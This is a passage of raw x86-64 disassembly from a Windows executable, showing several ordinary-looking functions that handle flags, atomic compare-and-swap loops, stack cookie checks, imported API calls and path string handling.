   140008f9f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140008fa4:	48 c7 44 24 38 01 00 	movq   $0x1,0x38(%rsp)
   140008fab:	00 00 
   140008fad:	44 8b cb             	mov    %ebx,%r9d
   140008fb0:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   140008fb5:	45 33 c0             	xor    %r8d,%r8d
   140008fb8:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140008fbe:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008fc3:	b9 dd 9d 5c 03       	mov    $0x35c9ddd,%ecx
   140008fc8:	e8 43 10 00 00       	call   0x14000a010
   140008fcd:	48 83 c4 50          	add    $0x50,%rsp
   140008fd1:	5b                   	pop    %rbx
   140008fd2:	c3                   	ret
   140008fd3:	cc                   	int3
   140008fd4:	cc                   	int3
   140008fd5:	cc                   	int3
   140008fd6:	cc                   	int3
   140008fd7:	cc                   	int3
   140008fd8:	cc                   	int3
   140008fd9:	cc                   	int3
   140008fda:	cc                   	int3
   140008fdb:	cc                   	int3
   140008fdc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008fe1:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008fe6:	57                   	push   %rdi
   140008fe7:	48 83 ec 70          	sub    $0x70,%rsp
   140008feb:	48 8b 05 8e 50 00 00 	mov    0x508e(%rip),%rax        # 0x14000e080
   140008ff2:	48 33 c4             	xor    %rsp,%rax
   140008ff5:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140008ffa:	4c 8b ca             	mov    %rdx,%r9
   140008ffd:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140009002:	48 8b da             	mov    %rdx,%rbx
   140009005:	49 c1 e9 20          	shr    $0x20,%r9
   140009009:	48 8b 15 90 3a 00 00 	mov    0x3a90(%rip),%rdx        # 0x14000caa0
   140009010:	41 8b f0             	mov    %r8d,%esi
   140009013:	e8 b4 fb ff ff       	call   0x140008bcc
   140009018:	33 ff                	xor    %edi,%edi
   14000901a:	f2 0f 10 40 10       	movsd  0x10(%rax),%xmm0
   14000901f:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140009025:	0f ba e3 0a          	bt     $0xa,%ebx
   140009029:	0f 83 84 00 00 00    	jae    0x1400090b3
   14000902f:	81 fe fe 00 00 00    	cmp    $0xfe,%esi
   140009035:	74 7c                	je     0x1400090b3
   140009037:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000903c:	c7 44 24 30 dd 9d 5c 	movl   $0x35c9ddd,0x30(%rsp)
   140009043:	03 
   140009044:	66 89 74 24 34       	mov    %si,0x34(%rsp)
   140009049:	0f ba e3 0b          	bt     $0xb,%ebx
   14000904d:	73 06                	jae    0x140009055
   14000904f:	66 83 4c 24 36 01    	orw    $0x1,0x36(%rsp)
   140009055:	48 8b 05 6c 58 00 00 	mov    0x586c(%rip),%rax        # 0x14000e8c8
   14000905c:	48 85 c0             	test   %rax,%rax
   14000905f:	75 48                	jne    0x1400090a9
   140009061:	48 8b 05 90 58 00 00 	mov    0x5890(%rip),%rax        # 0x14000e8f8
   140009068:	48 85 c0             	test   %rax,%rax
   14000906b:	75 1a                	jne    0x140009087
   14000906d:	48 8d 0d 64 29 00 00 	lea    0x2964(%rip),%rcx        # 0x14000b9d8
   140009074:	48 ff 15 fd 23 00 00 	rex.W call *0x23fd(%rip)        # 0x14000b478
   14000907b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009080:	48 89 05 71 58 00 00 	mov    %rax,0x5871(%rip)        # 0x14000e8f8
   140009087:	48 8d 15 a2 29 00 00 	lea    0x29a2(%rip),%rdx        # 0x14000ba30
   14000908e:	48 8b c8             	mov    %rax,%rcx
   140009091:	48 ff 15 b0 22 00 00 	rex.W call *0x22b0(%rip)        # 0x14000b348
   140009098:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000909d:	48 89 05 24 58 00 00 	mov    %rax,0x5824(%rip)        # 0x14000e8c8
   1400090a4:	48 85 c0             	test   %rax,%rax
   1400090a7:	74 0a                	je     0x1400090b3
   1400090a9:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400090ae:	e8 5d 0f 00 00       	call   0x14000a010
   1400090b3:	39 7c 24 60          	cmp    %edi,0x60(%rsp)
   1400090b7:	40 0f 94 c7          	sete   %dil
   1400090bb:	8b c7                	mov    %edi,%eax
   1400090bd:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400090c2:	48 33 cc             	xor    %rsp,%rcx
   1400090c5:	e8 e6 0a 00 00       	call   0x140009bb0
   1400090ca:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1400090cf:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400090d3:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400090d7:	49 8b e3             	mov    %r11,%rsp
   1400090da:	5f                   	pop    %rdi
   1400090db:	c3                   	ret
   1400090dc:	cc                   	int3
   1400090dd:	cc                   	int3
   1400090de:	cc                   	int3
   1400090df:	cc                   	int3
   1400090e0:	cc                   	int3
   1400090e1:	cc                   	int3
   1400090e2:	cc                   	int3
   1400090e3:	cc                   	int3
   1400090e4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400090e9:	55                   	push   %rbp
   1400090ea:	56                   	push   %rsi
   1400090eb:	57                   	push   %rdi
   1400090ec:	41 56                	push   %r14
   1400090ee:	41 57                	push   %r15
   1400090f0:	48 83 ec 20          	sub    $0x20,%rsp
   1400090f4:	48 8b 05 55 58 00 00 	mov    0x5855(%rip),%rax        # 0x14000e950
   1400090fb:	33 ed                	xor    %ebp,%ebp
   1400090fd:	21 6c 24 50          	and    %ebp,0x50(%rsp)
   140009101:	4d 8b f0             	mov    %r8,%r14
   140009104:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140009109:	48 8b fa             	mov    %rdx,%rdi
   14000910c:	4c 8b f9             	mov    %rcx,%r15
   14000910f:	48 85 c0             	test   %rax,%rax
   140009112:	74 07                	je     0x14000911b
   140009114:	e8 f7 0e 00 00       	call   0x14000a010
   140009119:	8b e8                	mov    %eax,%ebp
   14000911b:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140009120:	49 8b ce             	mov    %r14,%rcx
   140009123:	e8 20 01 00 00       	call   0x140009248
   140009128:	41 80 7e 1c 00       	cmpb   $0x0,0x1c(%r14)
   14000912d:	48 8b d8             	mov    %rax,%rbx
   140009130:	75 0a                	jne    0x14000913c
   140009132:	8b cd                	mov    %ebp,%ecx
   140009134:	f7 d9                	neg    %ecx
   140009136:	1b d2                	sbb    %edx,%edx
   140009138:	21 54 24 50          	and    %edx,0x50(%rsp)
   14000913c:	8b c7                	mov    %edi,%eax
   14000913e:	8b cf                	mov    %edi,%ecx
   140009140:	83 7c 24 50 00       	cmpl   $0x0,0x50(%rsp)
   140009145:	8b f0                	mov    %eax,%esi
   140009147:	89 44 24 58          	mov    %eax,0x58(%rsp)
   14000914b:	74 1f                	je     0x14000916c
   14000914d:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140009151:	f6 c1 02             	test   $0x2,%cl
   140009154:	75 16                	jne    0x14000916c
   140009156:	81 e6 3e f6 ff ff    	and    $0xfffff63e,%esi
   14000915c:	8b c3                	mov    %ebx,%eax
   14000915e:	25 c1 09 00 00       	and    $0x9c1,%eax
   140009163:	0b f0                	or     %eax,%esi
   140009165:	83 ce 02             	or     $0x2,%esi
   140009168:	89 74 24 58          	mov    %esi,0x58(%rsp)
   14000916c:	40 f6 c7 04          	test   $0x4,%dil
   140009170:	75 19                	jne    0x14000918b
   140009172:	8b c6                	mov    %esi,%eax
   140009174:	8b cb                	mov    %ebx,%ecx
   140009176:	81 e1 00 04 00 00    	and    $0x400,%ecx
   14000917c:	0f ba f0 0a          	btr    $0xa,%eax
   140009180:	8b f1                	mov    %ecx,%esi
   140009182:	0b f0                	or     %eax,%esi
   140009184:	83 ce 04             	or     $0x4,%esi
   140009187:	89 74 24 58          	mov    %esi,0x58(%rsp)
   14000918b:	8b c7                	mov    %edi,%eax
   14000918d:	f0 41 0f b1 37       	lock cmpxchg %esi,(%r15)
   140009192:	74 06                	je     0x14000919a
   140009194:	8b f8                	mov    %eax,%edi
   140009196:	8b c8                	mov    %eax,%ecx
   140009198:	eb a6                	jmp    0x140009140
   14000919a:	40 f6 c7 04          	test   $0x4,%dil
   14000919e:	75 1c                	jne    0x1400091bc
   1400091a0:	48 8b 05 49 57 00 00 	mov    0x5749(%rip),%rax        # 0x14000e8f0
   1400091a7:	48 85 c0             	test   %rax,%rax
   1400091aa:	74 10                	je     0x1400091bc
   1400091ac:	41 0f b6 56 1c       	movzbl 0x1c(%r14),%edx
   1400091b1:	44 8b c5             	mov    %ebp,%r8d
   1400091b4:	49 8b cf             	mov    %r15,%rcx
   1400091b7:	e8 54 0e 00 00       	call   0x14000a010
   1400091bc:	83 7c 24 50 00       	cmpl   $0x0,0x50(%rsp)
   1400091c1:	75 12                	jne    0x1400091d5
   1400091c3:	81 e3 c1 09 00 00    	and    $0x9c1,%ebx
   1400091c9:	81 e6 3e f6 ff ff    	and    $0xfffff63e,%esi
   1400091cf:	0b de                	or     %esi,%ebx
   1400091d1:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   1400091d5:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400091da:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400091df:	48 83 c4 20          	add    $0x20,%rsp
   1400091e3:	41 5f                	pop    %r15
   1400091e5:	41 5e                	pop    %r14
   1400091e7:	5f                   	pop    %rdi
   1400091e8:	5e                   	pop    %rsi
   1400091e9:	5d                   	pop    %rbp
   1400091ea:	c3                   	ret
   1400091eb:	cc                   	int3
   1400091ec:	cc                   	int3
   1400091ed:	cc                   	int3
   1400091ee:	cc                   	int3
   1400091ef:	cc                   	int3
   1400091f0:	cc                   	int3
   1400091f1:	cc                   	int3
   1400091f2:	cc                   	int3
   1400091f3:	cc                   	int3
   1400091f4:	4c 8b 15 9d 38 00 00 	mov    0x389d(%rip),%r10        # 0x14000ca98
   1400091fb:	83 ea 03             	sub    $0x3,%edx
   1400091fe:	74 0b                	je     0x14000920b
   140009200:	83 fa 01             	cmp    $0x1,%edx
   140009203:	75 3a                	jne    0x14000923f
   140009205:	44 8d 42 1f          	lea    0x1f(%rdx),%r8d
   140009209:	eb 06                	jmp    0x140009211
   14000920b:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140009211:	41 8b 02             	mov    (%r10),%eax
   140009214:	44 8b c8             	mov    %eax,%r9d
   140009217:	8b d0                	mov    %eax,%edx
   140009219:	a8 02                	test   $0x2,%al
   14000921b:	74 22                	je     0x14000923f
   14000921d:	83 e1 01             	and    $0x1,%ecx
   140009220:	83 e2 01             	and    $0x1,%edx
   140009223:	3b d1                	cmp    %ecx,%edx
   140009225:	75 18                	jne    0x14000923f
   140009227:	41 8b d0             	mov    %r8d,%edx
   14000922a:	0b d0                	or     %eax,%edx
   14000922c:	41 8b c1             	mov    %r9d,%eax
   14000922f:	f0 41 0f b1 12       	lock cmpxchg %edx,(%r10)
   140009234:	74 09                	je     0x14000923f
   140009236:	44 8b c8             	mov    %eax,%r9d
   140009239:	8b d0                	mov    %eax,%edx
   14000923b:	a8 02                	test   $0x2,%al
   14000923d:	75 e1                	jne    0x140009220
   14000923f:	c3                   	ret
   140009240:	cc                   	int3
   140009241:	cc                   	int3
   140009242:	cc                   	int3
   140009243:	cc                   	int3
   140009244:	cc                   	int3
   140009245:	cc                   	int3
   140009246:	cc                   	int3
   140009247:	cc                   	int3
   140009248:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000924d:	55                   	push   %rbp
   14000924e:	56                   	push   %rsi
   14000924f:	57                   	push   %rdi
   140009250:	41 54                	push   %r12
   140009252:	41 56                	push   %r14
   140009254:	48 8b ec             	mov    %rsp,%rbp
   140009257:	48 83 ec 70          	sub    $0x70,%rsp
   14000925b:	48 8b 05 1e 4e 00 00 	mov    0x4e1e(%rip),%rax        # 0x14000e080
   140009262:	48 33 c4             	xor    %rsp,%rax
   140009265:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009269:	8a 41 1c             	mov    0x1c(%rcx),%al
   14000926c:	33 f6                	xor    %esi,%esi
   14000926e:	44 8b 71 18          	mov    0x18(%rcx),%r14d
   140009272:	2c 02                	sub    $0x2,%al
   140009274:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009277:	48 8b f9             	mov    %rcx,%rdi
   14000927a:	0f 11 45 c8          	movups %xmm0,-0x38(%rbp)
   14000927e:	44 8d 66 01          	lea    0x1(%rsi),%r12d
   140009282:	41 3a c4             	cmp    %r12b,%al
   140009285:	44 89 22             	mov    %r12d,(%rdx)
   140009288:	40 0f 97 c6          	seta   %sil
   14000928c:	33 c0                	xor    %eax,%eax
   14000928e:	48 21 45 c0          	and    %rax,-0x40(%rbp)
   140009292:	33 db                	xor    %ebx,%ebx
   140009294:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140009298:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000929c:	89 45 e8             	mov    %eax,-0x18(%rbp)
   14000929f:	48 8b 05 2a 56 00 00 	mov    0x562a(%rip),%rax        # 0x14000e8d0
   1400092a6:	48 85 c0             	test   %rax,%rax
   1400092a9:	75 48                	jne    0x1400092f3
   1400092ab:	48 8b 05 46 56 00 00 	mov    0x5646(%rip),%rax        # 0x14000e8f8
   1400092b2:	48 85 c0             	test   %rax,%rax
   1400092b5:	75 1a                	jne    0x1400092d1
   1400092b7:	48 8d 0d 1a 27 00 00 	lea    0x271a(%rip),%rcx        # 0x14000b9d8
   1400092be:	48 ff 15 b3 21 00 00 	rex.W call *0x21b3(%rip)        # 0x14000b478
   1400092c5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400092ca:	48 89 05 27 56 00 00 	mov    %rax,0x5627(%rip)        # 0x14000e8f8
   1400092d1:	48 8d 15 38 27 00 00 	lea    0x2738(%rip),%rdx        # 0x14000ba10
   1400092d8:	48 8b c8             	mov    %rax,%rcx
   1400092db:	48 ff 15 66 20 00 00 	rex.W call *0x2066(%rip)        # 0x14000b348
   1400092e2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400092e7:	48 89 05 e2 55 00 00 	mov    %rax,0x55e2(%rip)        # 0x14000e8d0
   1400092ee:	48 85 c0             	test   %rax,%rax
   1400092f1:	74 4b                	je     0x14000933e
   1400092f3:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   1400092f7:	8b d6                	mov    %esi,%edx
   1400092f9:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   1400092fd:	41 8b ce             	mov    %r14d,%ecx
   140009300:	e8 0b 0d 00 00       	call   0x14000a010
   140009305:	85 c0                	test   %eax,%eax
   140009307:	75 20                	jne    0x140009329
   140009309:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000930c:	41 8b dc             	mov    %r12d,%ebx
   14000930f:	8b d0                	mov    %eax,%edx
   140009311:	44 8b c0             	mov    %eax,%r8d
   140009314:	c1 ea 04             	shr    $0x4,%edx
   140009317:	41 c1 e8 06          	shr    $0x6,%r8d
   14000931b:	83 e2 03             	and    $0x3,%edx
   14000931e:	45 23 c4             	and    %r12d,%r8d
   140009321:	c1 e8 07             	shr    $0x7,%eax
   140009324:	41 23 c4             	and    %r12d,%eax
   140009327:	eb 1f                	jmp    0x140009348
   140009329:	3d 17 01 00 00       	cmp    $0x117,%eax
   14000932e:	75 0e                	jne    0x14000933e
   140009330:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140009333:	41 8b dc             	mov    %r12d,%ebx
   140009336:	c1 e8 07             	shr    $0x7,%eax
   140009339:	41 23 c4             	and    %r12d,%eax
   14000933c:	eb 03                	jmp    0x140009341
   14000933e:	8b 45 d8             	mov    -0x28(%rbp),%eax
   140009341:	8b 55 c8             	mov    -0x38(%rbp),%edx
   140009344:	44 8b 45 dc          	mov    -0x24(%rbp),%r8d
   140009348:	48 83 65 e0 00       	andq   $0x0,-0x20(%rbp)
   14000934d:	f7 d8                	neg    %eax
   14000934f:	1b c9                	sbb    %ecx,%ecx
   140009351:	81 e1 00 04 00 00    	and    $0x400,%ecx
   140009357:	41 f7 d8             	neg    %r8d
   14000935a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140009360:	1b c0                	sbb    %eax,%eax
   140009362:	25 00 08 00 00       	and    $0x800,%eax
   140009367:	0b c8                	or     %eax,%ecx
   140009369:	f7 db                	neg    %ebx
   14000936b:	1b c0                	sbb    %eax,%eax
   14000936d:	23 c2                	and    %edx,%eax
   14000936f:	83 e0 03             	and    $0x3,%eax
   140009372:	44 8b c8             	mov    %eax,%r9d
   140009375:	41 c1 e1 07          	shl    $0x7,%r9d
   140009379:	44 0b c9             	or     %ecx,%r9d
   14000937c:	85 c0                	test   %eax,%eax
   14000937e:	75 0f                	jne    0x14000938f
   140009380:	8a 47 1f             	mov    0x1f(%rdi),%al
   140009383:	f6 d8                	neg    %al
   140009385:	1b c9                	sbb    %ecx,%ecx
   140009387:	41 23 c8             	and    %r8d,%ecx
   14000938a:	41 0b c9             	or     %r9d,%ecx
   14000938d:	eb 0e                	jmp    0x14000939d
   14000938f:	33 c0                	xor    %eax,%eax
   140009391:	41 8b c9             	mov    %r9d,%ecx
   140009394:	83 fa 02             	cmp    $0x2,%edx
   140009397:	41 0f 44 c0          	cmove  %r8d,%eax
   14000939b:	0b c8                	or     %eax,%ecx
   14000939d:	8b d9                	mov    %ecx,%ebx
   14000939f:	c1 eb 06             	shr    $0x6,%ebx
   1400093a2:	33 d9                	xor    %ecx,%ebx
   1400093a4:	41 23 dc             	and    %r12d,%ebx
   1400093a7:	33 d9                	xor    %ecx,%ebx
   1400093a9:	89 5d e0             	mov    %ebx,-0x20(%rbp)
   1400093ac:	41 84 c8             	test   %cl,%r8b
   1400093af:	0f 84 83 00 00 00    	je     0x140009438
   1400093b5:	48 8b 7f 20          	mov    0x20(%rdi),%rdi
   1400093b9:	48 85 ff             	test   %rdi,%rdi
   1400093bc:	74 7a                	je     0x140009438
   1400093be:	89 5d e0             	mov    %ebx,-0x20(%rbp)
   1400093c1:	be fe ff ff ff       	mov    $0xfffffffe,%esi
   1400093c6:	48 8b 0f             	mov    (%rdi),%rcx
   1400093c9:	48 85 c9             	test   %rcx,%rcx
   1400093cc:	74 6a                	je     0x140009438
   1400093ce:	80 79 1e 00          	cmpb   $0x0,0x1e(%rcx)
   1400093d2:	75 42                	jne    0x140009416
   1400093d4:	80 79 1d 00          	cmpb   $0x0,0x1d(%rcx)
   1400093d8:	75 3c                	jne    0x140009416
   1400093da:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   1400093df:	4c 8b 09             	mov    (%rcx),%r9
   1400093e2:	41 8b 01             	mov    (%r9),%eax
   1400093e5:	89 45 c0             	mov    %eax,-0x40(%rbp)
   1400093e8:	a8 02                	test   $0x2,%al
   1400093ea:	74 06                	je     0x1400093f2
   1400093ec:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   1400093f0:	eb 0f                	jmp    0x140009401
   1400093f2:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   1400093f6:	4c 8b c1             	mov    %rcx,%r8
   1400093f9:	49 8b c9             	mov    %r9,%rcx
   1400093fc:	e8 e3 fc ff ff       	call   0x1400090e4
   140009401:	23 c3                	and    %ebx,%eax
   140009403:	b9 00 00 00 00       	mov    $0x0,%ecx
   140009408:	41 84 c4             	test   %al,%r12b
   14000940b:	8b c3                	mov    %ebx,%eax
   14000940d:	0f 95 c1             	setne  %cl
   140009410:	23 c6                	and    %esi,%eax
   140009412:	8b d9                	mov    %ecx,%ebx
   140009414:	eb 14                	jmp    0x14000942a
   140009416:	41 84 dc             	test   %bl,%r12b
   140009419:	74 0b                	je     0x140009426
   14000941b:	80 79 1f 00          	cmpb   $0x0,0x1f(%rcx)
   14000941f:	74 05                	je     0x140009426
   140009421:	41 8b c4             	mov    %r12d,%eax
   140009424:	eb 02                	jmp    0x140009428
   140009426:	33 c0                	xor    %eax,%eax
   140009428:	23 de                	and    %esi,%ebx
   14000942a:	0b d8                	or     %eax,%ebx
   14000942c:	48 83 c7 08          	add    $0x8,%rdi
   140009430:	89 5d e0             	mov    %ebx,-0x20(%rbp)
   140009433:	41 84 dc             	test   %bl,%r12b
   140009436:	75 8e                	jne    0x1400093c6
   140009438:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000943c:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140009440:	48 33 cc             	xor    %rsp,%rcx
   140009443:	e8 68 07 00 00       	call   0x140009bb0
   140009448:	48 8b 9c 24 b0 00 00 	mov    0xb0(%rsp),%rbx
   14000944f:	00 
   140009450:	48 83 c4 70          	add    $0x70,%rsp
   140009454:	41 5e                	pop    %r14
   140009456:	41 5c                	pop    %r12
   140009458:	5f                   	pop    %rdi
   140009459:	5e                   	pop    %rsi
   14000945a:	5d                   	pop    %rbp
   14000945b:	c3                   	ret
   14000945c:	cc                   	int3
   14000945d:	cc                   	int3
   14000945e:	cc                   	int3
   14000945f:	cc                   	int3
   140009460:	cc                   	int3
   140009461:	cc                   	int3
   140009462:	cc                   	int3
   140009463:	cc                   	int3
   140009464:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009469:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000946e:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140009473:	57                   	push   %rdi
   140009474:	48 83 ec 20          	sub    $0x20,%rsp
   140009478:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000947e:	8b f2                	mov    %edx,%esi
   140009480:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   140009484:	48 8b d9             	mov    %rcx,%rbx
   140009487:	f6 c1 02             	test   $0x2,%cl
   14000948a:	75 24                	jne    0x1400094b0
   14000948c:	48 8b d1             	mov    %rcx,%rdx
   14000948f:	4c 8d 05 02 36 00 00 	lea    0x3602(%rip),%r8        # 0x14000ca98
   140009496:	48 8b 0d fb 35 00 00 	mov    0x35fb(%rip),%rcx        # 0x14000ca98
   14000949d:	e8 42 fc ff ff       	call   0x1400090e4
   1400094a2:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400094a7:	48 8b f8             	mov    %rax,%rdi
   1400094aa:	8b 5c 24 40          	mov    0x40(%rsp),%ebx
   1400094ae:	eb 05                	jmp    0x1400094b5
   1400094b0:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400094b5:	85 f6                	test   %esi,%esi
   1400094b7:	74 1d                	je     0x1400094d6
   1400094b9:	44 8b c6             	mov    %esi,%r8d
   1400094bc:	48 8b d7             	mov    %rdi,%rdx
   1400094bf:	e8 fc f9 ff ff       	call   0x140008ec0
   1400094c4:	8d 46 fd             	lea    -0x3(%rsi),%eax
   1400094c7:	83 f8 01             	cmp    $0x1,%eax
   1400094ca:	77 0a                	ja     0x1400094d6
   1400094cc:	8b d6                	mov    %esi,%edx
   1400094ce:	48 8b cf             	mov    %rdi,%rcx
   1400094d1:	e8 1e fd ff ff       	call   0x1400091f4
   1400094d6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400094db:	83 e3 01             	and    $0x1,%ebx
   1400094de:	8b c3                	mov    %ebx,%eax
   1400094e0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400094e5:	48 83 c4 20          	add    $0x20,%rsp
   1400094e9:	5f                   	pop    %rdi
   1400094ea:	c3                   	ret
   1400094eb:	cc                   	int3
   1400094ec:	cc                   	int3
   1400094ed:	cc                   	int3
   1400094ee:	cc                   	int3
   1400094ef:	cc                   	int3
   1400094f0:	cc                   	int3
   1400094f1:	cc                   	int3
   1400094f2:	cc                   	int3
   1400094f3:	cc                   	int3
   1400094f4:	cc                   	int3
   1400094f5:	cc                   	int3
   1400094f6:	cc                   	int3
   1400094f7:	cc                   	int3
   1400094f8:	cc                   	int3
   1400094f9:	cc                   	int3
   1400094fa:	cc                   	int3
   1400094fb:	cc                   	int3
   1400094fc:	cc                   	int3
   1400094fd:	cc                   	int3
   1400094fe:	cc                   	int3
   1400094ff:	cc                   	int3
   140009500:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009505:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000950a:	57                   	push   %rdi
   14000950b:	48 83 ec 30          	sub    $0x30,%rsp
   14000950f:	48 8b d9             	mov    %rcx,%rbx
   140009512:	48 8b fa             	mov    %rdx,%rdi
   140009515:	48 8b 0d 14 54 00 00 	mov    0x5414(%rip),%rcx        # 0x14000e930
   14000951c:	e8 e7 ec ff ff       	call   0x140008208
   140009521:	83 3d 14 62 00 00 00 	cmpl   $0x0,0x6214(%rip)        # 0x14000f73c
   140009528:	74 08                	je     0x140009532
   14000952a:	83 c8 ff             	or     $0xffffffff,%eax
   14000952d:	e9 95 00 00 00       	jmp    0x1400095c7
   140009532:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   140009537:	48 8d 0d 5a 5c 00 00 	lea    0x5c5a(%rip),%rcx        # 0x14000f198
   14000953e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009544:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140009549:	48 c1 e3 05          	shl    $0x5,%rbx
   14000954d:	48 8b d7             	mov    %rdi,%rdx
   140009550:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   140009554:	48 ff 15 4d 1e 00 00 	rex.W call *0x1e4d(%rip)        # 0x14000b3a8
   14000955b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009560:	85 c0                	test   %eax,%eax
   140009562:	75 05                	jne    0x140009569
   140009564:	83 cb ff             	or     $0xffffffff,%ebx
   140009567:	eb 5c                	jmp    0x1400095c5
   140009569:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   14000956d:	83 fb ff             	cmp    $0xffffffff,%ebx
   140009570:	74 53                	je     0x1400095c5
   140009572:	8b 15 f4 63 00 00    	mov    0x63f4(%rip),%edx        # 0x14000f96c
   140009578:	03 d3                	add    %ebx,%edx
   14000957a:	83 3d db 4c 00 00 00 	cmpl   $0x0,0x4cdb(%rip)        # 0x14000e25c
   140009581:	89 15 e5 63 00 00    	mov    %edx,0x63e5(%rip)        # 0x14000f96c
   140009587:	74 3c                	je     0x1400095c5
   140009589:	48 8b 0d 58 53 00 00 	mov    0x5358(%rip),%rcx        # 0x14000e8e8
   140009590:	48 85 c9             	test   %rcx,%rcx
   140009593:	74 30                	je     0x1400095c5
   140009595:	44 8b 05 c8 63 00 00 	mov    0x63c8(%rip),%r8d        # 0x14000f964
   14000959c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400095a2:	48 6b c2 64          	imul   $0x64,%rdx,%rax
   1400095a6:	33 d2                	xor    %edx,%edx
   1400095a8:	49 f7 f0             	div    %r8
   1400095ab:	ba 3a 08 00 00       	mov    $0x83a,%edx
   1400095b0:	41 b8 02 04 00 00    	mov    $0x402,%r8d
   1400095b6:	4c 8b c8             	mov    %rax,%r9
   1400095b9:	48 ff 15 88 20 00 00 	rex.W call *0x2088(%rip)        # 0x14000b648
   1400095c0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400095c5:	8b c3                	mov    %ebx,%eax
   1400095c7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400095cc:	48 83 c4 30          	add    $0x30,%rsp
   1400095d0:	5f                   	pop    %rdi
   1400095d1:	c3                   	ret
   1400095d2:	cc                   	int3
   1400095d3:	cc                   	int3
   1400095d4:	cc                   	int3
   1400095d5:	cc                   	int3
   1400095d6:	cc                   	int3
   1400095d7:	cc                   	int3
   1400095d8:	cc                   	int3
   1400095d9:	cc                   	int3
   1400095da:	cc                   	int3
   1400095db:	cc                   	int3
   1400095dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400095e1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400095e6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400095eb:	57                   	push   %rdi
   1400095ec:	48 83 ec 20          	sub    $0x20,%rsp
   1400095f0:	49 8b f8             	mov    %r8,%rdi
   1400095f3:	8b ea                	mov    %edx,%ebp
   1400095f5:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   1400095f9:	48 8b f1             	mov    %rcx,%rsi
   1400095fc:	49 ff c0             	inc    %r8
   1400095ff:	42 80 3c 01 00       	cmpb   $0x0,(%rcx,%r8,1)
   140009604:	75 f6                	jne    0x1400095fc
   140009606:	41 8d 40 01          	lea    0x1(%r8),%eax
   14000960a:	3b c5                	cmp    %ebp,%eax
   14000960c:	72 07                	jb     0x140009615
   14000960e:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
   140009613:	eb 40                	jmp    0x140009655
   140009615:	41 8b d8             	mov    %r8d,%ebx
   140009618:	48 03 de             	add    %rsi,%rbx
   14000961b:	48 3b de             	cmp    %rsi,%rbx
   14000961e:	76 1a                	jbe    0x14000963a
   140009620:	48 8b d3             	mov    %rbx,%rdx
   140009623:	48 ff 15 c6 1f 00 00 	rex.W call *0x1fc6(%rip)        # 0x14000b5f0
   14000962a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000962f:	80 38 5c             	cmpb   $0x5c,(%rax)
   140009632:	74 06                	je     0x14000963a
   140009634:	c6 03 5c             	movb   $0x5c,(%rbx)
   140009637:	48 ff c3             	inc    %rbx
